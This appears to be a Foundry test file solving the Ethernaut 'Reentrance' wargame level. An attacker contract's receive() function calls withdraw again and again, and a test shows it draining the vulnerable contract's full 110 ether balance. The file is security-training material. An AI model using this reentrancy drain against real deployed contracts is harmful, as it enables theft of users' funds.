// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/Reentrance.sol";

contract ExploitReentrance {
    Reentrance reentrance;

    function donate(address payable _reentrance) external payable {
        reentrance = Reentrance(_reentrance);
        reentrance.donate{value: msg.value}(address(this));
    }

    function withdraw(address payable _reentrance, uint256 amount) external {
        reentrance = Reentrance(_reentrance);
        reentrance.withdraw(amount);
    }

    receive() external payable {
        reentrance = Reentrance(payable(msg.sender));
        uint256 balance = address(reentrance).balance;
        uint256 amount = balance > msg.value ? msg.value : balance;
        if(amount > 0) {
            reentrance.withdraw(amount);
        }
    }
}


contract TestReentrance is Test {
    Reentrance reentrance;
    ExploitReentrance exploitReentrance;
    address user1 = address(0x51);
    address user2 = address(0x52);

    function setUp() external {
        reentrance = new Reentrance();
        exploitReentrance = new ExploitReentrance();
        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);
        vm.prank(user1);
        reentrance.donate{value: 50 ether}(user1);
        vm.prank(user2);
        reentrance.donate{value: 60 ether}(user2);
    }

    function testExploit() external {
        // test initial setup
        assertEq(address(reentrance).balance, 110 ether);

        exploitReentrance.donate{value: 10 ether}(payable(reentrance));
        exploitReentrance.withdraw(payable(reentrance), 10 ether);
        assertEq(address(reentrance).balance, 0);
        assertEq(address(exploitReentrance).balance, 120 ether);
    }
}
